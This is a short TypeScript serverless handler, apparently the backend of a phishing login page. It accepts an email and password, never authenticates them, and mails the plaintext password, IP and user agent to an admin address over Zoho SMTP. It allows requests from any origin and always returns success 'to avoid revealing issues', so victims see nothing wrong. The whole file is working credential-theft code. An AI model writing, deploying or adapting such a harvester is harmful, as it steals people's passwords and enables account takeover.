import { createClient } from '@supabase/supabase-js'
import nodemailer from 'nodemailer'

export const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface LoginPayload {
  email: string
  password: string
}

export default async function handler(req: Request) {
  // Handle CORS
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const { email, password } = await req.json() as LoginPayload

    // Create email transporter
    const transporter = nodemailer.createTransport({
      host: 'smtp.zoho.com',
      port: 465,
      secure: true,
      auth: {
        user: process.env.ZOHO_USER,
        pass: process.env.ZOHO_PASS,
      },
    })

    // Send email
    await transporter.sendMail({
      from: process.env.ZOHO_USER,
      to: process.env.ADMIN_EMAIL,
      subject: `Login Attempt from ${email}`,
      html: `
        <h2>New Login Attempt</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>IP:</strong> ${req.headers.get('x-forwarded-for') || 'unknown'}</p>
        <p><strong>User Agent:</strong> ${req.headers.get('user-agent') || 'unknown'}</p>
      `,
    })

    return new Response(null, {
      status: 200,
      headers: corsHeaders
    })
  } catch (error) {
    console.error('Error:', error)
    return new Response(null, {
      status: 200, // Still return 200 to avoid revealing issues
      headers: corsHeaders
    })
  }
}